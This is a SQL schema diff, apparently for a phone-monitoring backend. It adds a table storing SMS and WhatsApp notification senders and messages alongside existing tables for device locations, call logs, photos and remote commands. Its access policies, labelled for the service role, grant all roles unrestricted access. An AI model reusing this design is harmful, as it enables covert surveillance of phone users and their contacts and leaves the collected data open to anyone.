@@ -54,6 +54,18 @@ CREATE TABLE IF NOT EXISTS photos (
   created_at TIMESTAMPTZ DEFAULT NOW()
 );
 
+-- Notifications table (SMS, WhatsApp, etc.)
+CREATE TABLE IF NOT EXISTS notifications (
+  id UUID DEFAULT gen_random_uuid() PRIMARY KEY,
+  device_id TEXT REFERENCES devices(id) ON DELETE CASCADE,
+  app_package TEXT,
+  app_name TEXT,
+  sender TEXT,
+  message TEXT,
+  timestamp BIGINT,
+  created_at TIMESTAMPTZ DEFAULT NOW()
+);
+
 -- Enable Realtime on commands table
 ALTER PUBLICATION supabase_realtime ADD TABLE commands;
 
@@ -64,6 +76,8 @@ CREATE INDEX IF NOT EXISTS idx_locations_device_id ON locations(device_id);
 CREATE INDEX IF NOT EXISTS idx_locations_timestamp ON locations(timestamp DESC);
 CREATE INDEX IF NOT EXISTS idx_call_logs_device_id ON call_logs(device_id);
 CREATE INDEX IF NOT EXISTS idx_photos_device_id ON photos(device_id);
+CREATE INDEX IF NOT EXISTS idx_notifications_device_id ON notifications(device_id);
+CREATE INDEX IF NOT EXISTS idx_notifications_created_at ON notifications(created_at DESC);
 
 -- Row Level Security (RLS) - disable for server access
 ALTER TABLE devices ENABLE ROW LEVEL SECURITY;
@@ -71,6 +85,7 @@ ALTER TABLE commands ENABLE ROW LEVEL SECURITY;
 ALTER TABLE locations ENABLE ROW LEVEL SECURITY;
 ALTER TABLE call_logs ENABLE ROW LEVEL SECURITY;
 ALTER TABLE photos ENABLE ROW LEVEL SECURITY;
+ALTER TABLE notifications ENABLE ROW LEVEL SECURITY;
 
 -- Policies: allow all operations with service role key
 CREATE POLICY "Allow all for service role" ON devices FOR ALL USING (true);
@@ -78,6 +93,7 @@ CREATE POLICY "Allow all for service role" ON commands FOR ALL USING (true);
 CREATE POLICY "Allow all for service role" ON locations FOR ALL USING (true);
 CREATE POLICY "Allow all for service role" ON call_logs FOR ALL USING (true);
 CREATE POLICY "Allow all for service role" ON photos FOR ALL USING (true);
+CREATE POLICY "Allow all for service role" ON notifications FOR ALL USING (true);
 
 -- Create Storage Bucket for photos
 INSERT INTO storage.buckets (id, name, public)
